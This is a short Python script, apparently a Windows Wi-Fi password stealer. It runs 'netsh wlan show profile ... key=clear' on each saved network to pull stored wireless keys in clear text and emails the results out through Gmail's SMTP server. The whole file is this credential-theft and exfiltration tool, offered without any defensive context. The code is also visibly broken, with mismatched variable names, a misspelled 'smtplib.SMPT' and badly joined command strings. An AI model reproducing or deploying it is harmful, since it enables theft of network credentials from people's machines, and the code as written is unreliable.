#!/usr/bin/python

import subprocess
import smtplib
import re

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)
networks_lists = re.findall('(?:Profile\s*:\s)(.*)', networks)

output = ""
for network in network_list:
	command2 = "netsh wlan show profile" + network + "key=clear"
	one_network_result = subprocess.check_output(command2, shell=True)
	ouput = one_network_result

server = smtplib.SMPT('smtp.gmail.com', 587)
server.starttls()
server.login('email@gmail.com', 'password')
server.sendmail('email@gmail.com', 'email@gmail.com', output)
server.quit()
